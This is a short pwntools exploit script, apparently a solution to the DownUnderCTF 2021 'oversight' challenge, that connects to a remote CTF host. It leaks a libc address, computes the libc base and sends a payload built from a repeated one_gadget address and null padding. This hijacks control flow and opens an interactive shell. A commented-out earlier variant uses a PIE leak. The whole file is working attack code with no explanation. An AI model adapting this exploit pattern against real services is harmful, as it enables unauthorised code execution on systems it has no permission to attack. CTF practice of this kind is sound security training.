from pwn import *



#io = process('./oversight', env={"LD_PRELOAD":"./libc-2.27.so"})
libc = ELF('./libc-2.27.so')
io = remote('pwn-2021.duc.tf', 31909)


'''
print(io.recv())
io.send(b'\n')
print(io.recv())
io.sendline(b'18')
print(io.recvuntil(b'Your magic number is: '))
pie = int(io.recvline(), 16) - 0x2075
print(io.recv())
payload = p64(pie+0x10e0)*31+b'BBBBBBB'
io.sendline('256')
io.sendline(payload)
'''

print(io.recv())
io.send(b'\n')
print(io.recv())
io.sendline(b'15')
print(io.recvuntil(b'Your magic number is: '))
libc.address = int(io.recvline(), 16) - 0x8d4d3
print(io.recv())
payload = p64(libc.address+0x4f432)*25 + 6*b'\0\0\0\0\0\0\0\0' +b'BBBBBBB'
io.sendline('256')
io.sendline(payload)
print(io.recv())
io.interactive()
